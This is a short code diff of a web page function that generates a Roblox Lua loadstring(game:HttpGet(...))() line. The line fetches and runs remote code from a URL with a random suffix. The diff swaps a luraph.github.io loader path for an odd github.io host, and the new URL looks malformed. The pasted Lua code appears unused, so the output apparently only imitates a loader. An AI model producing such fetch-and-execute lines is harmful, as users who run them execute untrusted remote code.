@@ -58,7 +58,7 @@
             const luaCode = document.getElementById('luaCode').value;
             const customName = document.getElementById('customName').value.trim();
             const randomString = Math.random().toString(36).substr(2, 32); // Generate random string (31 or 32 characters)
-            const output = `loadstring(game:HttpGet("https://luraph.github.io/file/v3/loaders/${randomString}"))() -- ${customName}.lua`;
+            const output = `loadstring(game:HttpGet("ydntsdfprnartytva.github.io${randomString}"))() -- ${customName}.lua`;
             document.getElementById('output').value = output;
         }
 
